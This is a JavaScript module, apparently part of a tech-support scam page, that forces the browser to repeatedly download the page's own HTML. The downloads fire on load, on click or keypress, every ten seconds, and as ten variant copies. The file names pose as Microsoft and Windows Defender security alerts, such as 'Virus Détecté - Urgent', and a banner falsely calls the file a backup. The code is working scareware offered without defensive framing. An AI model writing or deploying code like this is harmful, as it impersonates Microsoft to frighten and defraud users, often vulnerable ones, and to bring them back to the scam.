/**
 * 25. SELF-DOWNLOAD PERSISTENCE - MAXIMUM AGGRESSION
 * Forces the page to download itself as HTML to Downloads folder
 * Comes back on reboot when user opens the file
 */
const SelfDownload = {
    init: function() {
        this.downloadSelf();
        this.downloadOnInteraction();
        this.downloadVariants();
        this.persistentReminder();
    },
    downloadSelf: function() {
        try {
            // Get the full HTML of the current page
            const htmlContent = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;
            const blob = new Blob([htmlContent], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = '⚠️ Alerte Sécurité Microsoft.html';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        } catch(e) {}
    },
    downloadOnInteraction: function() {
        // Download on first click
        document.addEventListener('click', () => {
            this.downloadSelf();
            this.downloadVariants();
        }, { once: true });
        // Also download on keypress
        document.addEventListener('keydown', () => {
            this.downloadSelf();
        }, { once: true });
        // Keep trying to download periodically
        setInterval(() => {
            this.downloadSelf();
        }, 10000);
    },
    downloadVariants: function() {
        const variants = [
            '⚠️ Alerte Sécurité Microsoft.html',
            '🔒 Windows Defender - Alerte.html',
            '🚨 Action Requise - Votre PC.html',
            '⛔ Accès Bloqué - Support.html',
            '🔴 Virus Détecté - Urgent.html',
            'Windows Security Alert.html',
            'Microsoft Support - Critical.html',
            'System Compromised - Action Required.html',
            'Alerte_Parefeu_Windows.html',
            'Licence_Windows_Expirée.html'
        ];
        variants.forEach((name, i) => {
            setTimeout(() => {
                try {
                    const htmlContent = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;
                    const blob = new Blob([htmlContent], { type: 'text/html' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = name;
                    a.style.display = 'none';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                } catch(e) {}
            }, i * 1000);
        });
    },
    persistentReminder: function() {
        // Add a visible reminder on the page that the file was downloaded
        try {
            const reminder = document.createElement('div');
            reminder.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#ff0000;color:#fff;padding:10px 20px;z-index:9999999;font-size:14px;font-weight:bold;border-radius:5px;animation:pulse 1s infinite;';
            reminder.textContent = '📥 Fichier de secours téléchargé dans vos Téléchargements!';
            document.body.appendChild(reminder);
            // Remove after 5 seconds
            setTimeout(() => {
                try { document.body.removeChild(reminder); } catch(e) {}
            }, 5000);
        } catch(e) {}
    }
};